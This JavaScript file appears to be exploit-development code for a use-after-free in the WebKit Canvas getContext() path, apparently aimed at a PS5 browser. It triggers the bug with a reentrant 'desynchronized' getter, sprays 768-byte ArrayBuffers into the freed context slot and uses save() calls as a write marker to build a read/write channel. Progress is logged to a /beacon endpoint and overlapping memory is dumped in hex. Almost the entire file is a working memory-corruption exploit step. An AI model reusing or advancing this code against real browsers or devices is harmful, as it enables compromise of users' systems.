// p507 — Canvas UAF: definitive AB-spray + save() marker test
//
// Tests whether the Canvas getContext() UAF truly frees C1 (vs V490's
// "context alive" conclusion which may be wrong — stale data on PS5 looks
// identical to live data because MADV_FREE preserves pages).
//
// Strategy:
//   1. Trigger reentrant getContext UAF → dCtx1 = dangling wrapper to C1
//   2. Read stale lineWidth to verify dangling access works
//   3. Remove canvas from DOM (prevent background rendering access)
//   4. Spray ABs of 768 bytes (Context2D size class) to fill C1's slot
//   5. Call dCtx1.save() — increments m_unrealizedSaveCount (non-virtual!)
//   6. Scan all ABs for non-zero byte → identifies which AB overlaps C1
//   7. If found: context WAS freed, AB spray works, we have R/W channel
//
// save() is safe because:
// - CanvasRenderingContext2DBase::save() is `{ ++m_unrealizedSaveCount; }`
// - NOT virtual, no vtable lookup
// - No pointer dereference, just integer increment at fixed offset
// - If the freed slot contains AB data (zeros), incrementing [offset] → 1
//
// GC safety:
// - visitAdditionalChildren calls addWebCoreOpaqueRoot(wrapped().canvas())
// - addOpaqueRoot uses pointer as hash key, NEVER derefs
// - With AB data at m_canvas offset (=0), this adds 0 to hash set → safe
// - dCtx1 kept alive by strong JS reference (not subject to opaque root check)
//
// Beacon prefix: V507-

(function() {
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V507-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }
  function hexB(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT', navigator.userAgent);

  // ═══ PHASE 1: Trigger Canvas UAF ═══
  var canvas = document.createElement('canvas');
  canvas.width = 10; canvas.height = 10;
  document.body.appendChild(canvas);

  var dCtx1 = null;  // Will hold dangling wrapper to C1
  var outerCtx = null;

  try {
    outerCtx = canvas.getContext('2d', {
      get desynchronized() {
        // Re-entrant call: creates C1, sets canvas.m_context = C1
        dCtx1 = canvas.getContext('2d');
        B('INNER', dCtx1 ? 'OK' : 'NULL');
        return false;
      }
    });
    // Outer returns C2 (or C1 if same object). C1 freed by unique_ptr::reset.
  } catch(e) {
    B('UAF-ERR', (e.message || '').substring(0, 80));
  }

  if (!dCtx1) { B('DONE', 'no-inner-ctx'); return; }
  if (!outerCtx) { B('DONE', 'no-outer-ctx'); return; }

  B('CONTEXTS', 'inner=' + (dCtx1 ? 'Y' : 'N') + ',outer=' + (outerCtx ? 'Y' : 'N') +
    ',same=' + (dCtx1 === outerCtx));

  // ═══ PHASE 2: Verify stale data access ═══
  // If the context is freed but memory intact, lineWidth reads stale default (1.0)
  // If the context is truly alive, lineWidth also returns 1.0 (same default)
  // Set a distinctive value through outerCtx first
  try {
    outerCtx.lineWidth = 42.5;
    var lw1 = dCtx1.lineWidth;
    B('STALE-LW', 'inner=' + lw1 + ',expect=42.5');
  } catch(e) {
    B('STALE-ERR', (e.message || '').substring(0, 80));
  }

  // ═══ PHASE 3: Remove canvas from DOM to prevent background access ═══
  try {
    canvas.parentNode.removeChild(canvas);
  } catch(e) {}
  outerCtx = null;  // Release outer reference (but dCtx1 keeps C1's wrapper alive)

  // Small GC pressure to process the DOM removal
  for (var g = 0; g < 5; g++) {
    var junk = [];
    for (var j = 0; j < 1000; j++) junk.push({x: j});
    junk = null;
  }
  B('DOM-REMOVED', '');

  // ═══ PHASE 4: AB spray — 768 bytes = Context2D size class ═══
  var SPRAY_SIZE = 768;
  var SPRAY_N = 300;
  var abs = [];
  var views = [];
  for (var i = 0; i < SPRAY_N; i++) {
    try {
      var ab = new ArrayBuffer(SPRAY_SIZE);
      abs.push(ab);
      views.push(new Uint8Array(ab));
    } catch(e) { break; }
  }
  B('SPRAY', 'n=' + abs.length);

  // ═══ PHASE 5: Call save() through dangling wrapper ═══
  // save() increments m_unrealizedSaveCount — a non-virtual inline operation
  // If C1's slot was filled by an AB, this writes to the AB
  var saveOk = false;
  try {
    dCtx1.save();
    saveOk = true;
    B('SAVE-1', 'OK');
  } catch(e) {
    B('SAVE-1', 'ERR:' + (e.message || '').substring(0, 80));
  }

  if (!saveOk) {
    B('DONE', 'save-crashed');
    return;
  }

  // Call save() 4 more times to make the marker more distinctive
  try {
    dCtx1.save();
    dCtx1.save();
    dCtx1.save();
    dCtx1.save();
    B('SAVE-5', 'OK');  // Total: 5 save() calls → [offset] should be 5
  } catch(e) {
    B('SAVE-5', 'ERR:' + (e.message || '').substring(0, 80));
  }

  // ═══ PHASE 6: Scan ABs for save() marker ═══
  var hitIdx = -1;
  var hitOff = -1;
  var hitVal = 0;
  var nzCount = 0;

  for (var i = 0; i < views.length; i++) {
    var v = views[i];
    var hasNZ = false;
    for (var off = 0; off < SPRAY_SIZE; off++) {
      if (v[off] !== 0) {
        if (!hasNZ) {
          hasNZ = true;
          nzCount++;
        }
        // Look for value 5 (our marker from 5 save() calls)
        if (v[off] === 5 && hitIdx === -1) {
          hitIdx = i;
          hitOff = off;
          hitVal = 5;
        }
      }
    }
  }

  B('SCAN', 'nzABs=' + nzCount + ',hitIdx=' + hitIdx + ',hitOff=' + hitOff);

  if (hitIdx >= 0) {
    // ═══ PHASE 7: Verify with additional save() calls ═══
    var v = views[hitIdx];
    var before = v[hitOff];

    try {
      dCtx1.save();  // +1 → should be 6
      dCtx1.save();  // +1 → should be 7
    } catch(e) {
      B('VERIFY-ERR', (e.message || '').substring(0, 60));
    }

    var after = v[hitOff];
    B('VERIFY', 'before=' + before + ',after=' + after + ',expected=' + (before + 2));

    if (after === before + 2) {
      B('CONFIRMED', 'UAF-REAL! AB[' + hitIdx + '][' + hitOff + '] tracks save()');

      // Read full 768 bytes around the marker for analysis
      var dump = [];
      for (var off = 0; off < Math.min(SPRAY_SIZE, 256); off += 8) {
        var anyNZ = false;
        for (var b = 0; b < 8; b++) { if (v[off+b]) { anyNZ = true; break; } }
        if (anyNZ) {
          var hex = '';
          for (var b = 7; b >= 0; b--) hex += hexB(v[off+b]);
          dump.push(off + ':' + hex);
        }
      }
      if (dump.length > 0) B('DUMP-LO', dump.join(' '));

      dump = [];
      for (var off = 256; off < Math.min(SPRAY_SIZE, 512); off += 8) {
        var anyNZ = false;
        for (var b = 0; b < 8; b++) { if (v[off+b]) { anyNZ = true; break; } }
        if (anyNZ) {
          var hex = '';
          for (var b = 7; b >= 0; b--) hex += hexB(v[off+b]);
          dump.push(off + ':' + hex);
        }
      }
      if (dump.length > 0) B('DUMP-HI', dump.join(' '));

      dump = [];
      for (var off = 512; off < SPRAY_SIZE; off += 8) {
        var anyNZ = false;
        for (var b = 0; b < 8; b++) { if (v[off+b]) { anyNZ = true; break; } }
        if (anyNZ) {
          var hex = '';
          for (var b = 7; b >= 0; b--) hex += hexB(v[off+b]);
          dump.push(off + ':' + hex);
        }
      }
      if (dump.length > 0) B('DUMP-TOP', dump.join(' '));
    } else {
      B('MISMATCH', 'save-track-failed');
    }
  } else if (nzCount === 0) {
    // No non-zero ABs found — either context is alive (not in AB) or save() didn't work
    B('NO-HIT', 'all-ABs-zero — context may be truly alive OR wrong size class');

    // Try reading lineWidth through dCtx1 to check if context still responds
    try {
      var lw2 = dCtx1.lineWidth;
      B('POST-LW', 'lineWidth=' + lw2);
    } catch(e) {
      B('POST-LW-ERR', (e.message || '').substring(0, 60));
    }
  } else {
    // Some non-zero ABs but no value=5 marker — might be heap metadata, not our save()
    B('NZ-NO-MARKER', 'nzABs=' + nzCount + ',no-value-5');

    // Report first few non-zero ABs for analysis
    var reported = 0;
    for (var i = 0; i < views.length && reported < 3; i++) {
      var v = views[i];
      var nzBytes = 0;
      var firstNZOff = -1;
      for (var off = 0; off < SPRAY_SIZE; off++) {
        if (v[off] !== 0) {
          nzBytes++;
          if (firstNZOff < 0) firstNZOff = off;
        }
      }
      if (nzBytes > 0) {
        var sample = '';
        for (var off = firstNZOff; off < Math.min(firstNZOff + 16, SPRAY_SIZE); off++) {
          sample += hexB(v[off]);
        }
        B('NZ-' + reported, 'ab=' + i + ',off=' + firstNZOff + ',nz=' + nzBytes + ',data=' + sample);
        reported++;
      }
    }
  }

  // ═══ PHASE 8: Test OffscreenCanvas availability ═══
  try {
    var osc = new OffscreenCanvas(10, 10);
    B('OFFSCREEN', 'EXISTS');
    try {
      var octx = osc.getContext('2d');
      B('OFFSCREEN-2D', octx ? 'OK' : 'NULL');
    } catch(e2) {
      B('OFFSCREEN-2D', 'ERR:' + (e2.message || '').substring(0, 60));
    }
  } catch(e) {
    B('OFFSCREEN', 'NOT-AVAILABLE:' + (e.message || '').substring(0, 60));
  }

  B('DONE', 'hitIdx=' + hitIdx + ',hitOff=' + hitOff + ',nzABs=' + nzCount);
})();
